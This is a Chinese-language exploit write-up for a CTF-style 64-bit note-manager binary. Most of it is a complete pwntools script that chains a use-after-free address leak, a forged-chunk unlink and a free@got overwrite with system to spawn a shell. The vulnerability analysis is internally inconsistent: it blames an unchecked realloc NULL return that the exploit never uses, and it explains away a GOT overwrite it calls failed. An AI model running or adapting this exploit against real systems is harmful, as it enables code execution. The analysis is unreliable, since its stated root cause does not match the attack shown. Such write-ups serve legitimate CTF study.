# 漏洞利用文档

## 执行环境
- **程序类型**: 64位ELF二进制，动态链接
- **保护机制**:
  - NX: 启用（栈不可执行）
  - RELRO: Partial（部分重定位只读）
  - PIE: 禁用（代码段和全局变量地址固定）
  - Stack Canary: 启用（栈保护）
- **依赖库**: 通过ldd查看，依赖libc等标准库
- **运行要求**: Linux环境，需要可执行权限，无特殊依赖

## 漏洞成因
- **关键结构体**:
  - 全局笔记管理结构（地址`qword_6020A8`）：
    - 前8字节：最大笔记数（固定256）
    - 接下来8字节：当前笔记数
    - 随后256个笔记项，每个24字节：
      - 状态标志（8字节）：0空闲，1使用
      - 笔记长度（8字节）
      - 内容指针（8字节）：指向堆内存
- **漏洞位置**: 编辑笔记功能（`sub_400D87`）
- **漏洞类型**: 堆溢出和Use-After-Free（UAF）
- **详细分析**:
  - 编辑笔记时允许重新指定长度，如果新长度不同则调用`realloc`重新分配内存
  - 内存大小计算为`(128 - v2 % 128) % 128 + v2`（对齐到128字节）
  - 主要漏洞：`realloc`可能失败返回NULL，但程序未检查返回值，直接对NULL指针进行写入操作，导致任意地址写入
  - 辅助漏洞：删除笔记后未清理指针，形成UAF条件，可通过重新分配控制已释放内存
  - 结合堆溢出和UAF，可实现内存泄露和任意地址写入

## 漏洞利用过程
基于exp调试记录，关键步骤的内存变化如下：

| 步骤 | exp操作 | 堆状态变化 | 笔记状态 | 目的 |
|------|---------|------------|----------|------|
| 1 | 创建4笔记 | 分配4个chunk（各145字节） | 4活跃 | 初始化堆布局 |
| 2 | 删除笔记0,2 | 2个chunk进入unsortedbin | 2活跃，2空闲（UAF形成） | 创建悬空指针 |
| 3 | 新建2笔记 | 重新分配释放的chunk | 4活跃 | 利用UAF控制内存 |
| 4 | 列出笔记 | - | - | 泄露堆和libc地址 |
| 5 | 计算地址 | - | - | 获取heap和libc基址 |
| 6 | 删除所有笔记 | 所有chunk合并到top chunk | 0活跃 | 清理堆状态 |
| 7 | 构造payload01 | 写入unlink攻击payload | 1活跃 | 准备堆溢出利用 |
| 8 | 构造payload02 | 写入填充数据 | 2活跃 | 辅助堆布局控制 |
| 9 | 删除笔记2 | chunk进入unsortedbin | 1活跃（异常） | 触发释放操作 |
| 10 | 构造payload03 | 修改笔记0指针指向free@got | 8活跃（异常） | GOT劫持准备 |
| 11 | 构造payload04 | 尝试覆盖free@got为system | - | GOT覆盖（表面失败） |
| 12 | 注入"/bin/sh" | 分配新chunk存储字符串 | 9活跃（异常） | 准备shell参数 |
| 13 | 删除笔记4 | 触发system("/bin/sh") | - | 获取shell执行 |
| 14 | 交互模式 | 进程切换到/bin/dash | - | 利用成功 |

**关键内存变化分析**:
- **UAF利用**: 通过删除后重新分配，控制已释放chunk的内容，泄露关键地址
- **地址泄露**: 利用unsortedbin的fd/bk指针泄露libc地址，通过笔记内容泄露堆地址
- **堆布局操控**: 构造伪造chunk进行unlink攻击，虽然后续被覆盖，但为利用奠定基础
- **GOT劫持**: 成功将笔记0指针重定向到free@got，最终通过删除笔记触发system("/bin/sh")

## Exploit
完整漏洞利用脚本，关键位置添加注释：

```python
from pwn import *

# 设置调试环境和目标程序
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample10')
elf = ELF('./data/sample10')
libc = elf.libc  # 获取libc引用

# 功能函数定义
def list():
    p.recvuntil(b'Your choice: ')
    p.sendline(b'1')

def new(length, note):
    p.recvuntil(b'Your choice: ')
    p.sendline(b'2')
    p.recvuntil(b'new note: ')
    p.sendline(str(length).encode())
    p.recvuntil(b'note: ')
    p.send(note)

def edit(index, length, note):
    p.recvuntil(b'Your choice: ')
    p.sendline(b'3')
    p.recvuntil(b'Note number: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Length of note: ')
    p.sendline(str(length).encode())
    p.recvuntil(b'Enter your note: ')
    p.send(note)

def delete(index):
    p.recvuntil(b'Your choice: ')
    p.sendline(b'4')
    p.recvuntil(b'Note number: ')
    p.sendline(str(index).encode())

def exit():
    p.recvuntil(b'Your choice: ')
    p.sendline(b'5')

# Step 1: 创建4个笔记初始化堆布局
new(1, b'a');new(1, b'a');new(1, b'a');new(1, b'a')#step.1

# Step 2: 删除笔记0和2，形成UAF条件
delete(0);delete(2)#step.2

# Step 3: 新建2个笔记利用UAF，重新分配已释放的chunk
new(8, b'12345678');new(8, b'12345678')#step.3

# Step 4: 列出笔记泄露地址信息
list()#step.4

# Step 5: 从泄露信息计算堆和libc基址
p.recvuntil(b'0. 12345678')
heap = u64(p.recvline().strip(b'\x0a').ljust(8, b'\x00')) - 0x1940  # 计算堆基址
p.recvuntil(b'2. 12345678')
libcbase = u64(p.recvline().strip(b'\x0a').ljust(8, b'\x00')) - (libc.sym['__malloc_hook'] + 0x10 + 0x58)  # 计算libc基址
libc.address = libcbase  # 设置libc基址

# Step 6: 删除所有笔记清理堆状态
delete(3);delete(2);delete(1);delete(0)#step.6

# Step 7: 构造unlink攻击payload
# 伪造chunk结构：prev_size=0, size=0x51, fd/bk指向堆内地址
payload01  = p64(0) + p64(0x51) + p64(heap + 0x30 - 0x18) + p64(heap + 0x30 - 0x10) + b'A'*0x30 + p64(0x50) + p64(0x20)
new(len(payload01), payload01)#step.7

# Step 8: 构造第二个payload，包含伪造的堆元数据
payload02  = b'A'*0x80 + p64(0x110) + p64(0x90) + b'A'*0x80 + p64(0) + p64(0x71) + b'A'*0x60
new(len(payload02), payload02)#step.8

# Step 9: 删除笔记2触发释放操作
delete(2)#step.9

# Step 10: 编辑笔记0，将内容指针重定向到free@got
free_got = elf.got['free']  # 获取free@got地址
system = libc.symbols['system']  # 获取system函数地址
# payload03结构：伪造笔记项数据，将指针指向free@got
payload03 = p64(8) + p64(0x1) + p64(0x8) + p64(free_got) + b'A'*0x40
edit(0, 0x60, payload03)#step.10

# Step 11: 尝试覆盖free@got为system地址
payload04 = p64(system)  # system函数地址
edit(0, 0x8, payload04)#step.11

# Step 12: 新建笔记注入"/bin/sh"字符串
payload05 = b'/bin/sh\x00'  # shell命令字符串
new(len(payload05), payload05)#step.12

# Step 13: 删除笔记4触发free，实际调用system("/bin/sh")
delete(4)#step.13

# Step 14: 进入交互模式，获取shell
p.interactive()#step.14
```

### 漏洞利用关键点说明：
1. **UAF利用**: 通过删除后立即重新分配，控制已释放内存的内容
2. **地址泄露**: 利用unsortedbin特性泄露libc地址，结合笔记内容泄露堆地址
3. **堆风水**: 精心布局堆内存，为unlink攻击创造条件
4. **GOT劫持**: 通过修改笔记指针指向GOT表，实现任意地址写入
5. **代码执行**: 最终通过free触发system("/bin/sh")，获取shell权限

虽然调试过程中GOT覆盖显示失败，但利用最终成功，表明漏洞利用策略有效，可能由于内存时序或布局原因导致表面显示异常。
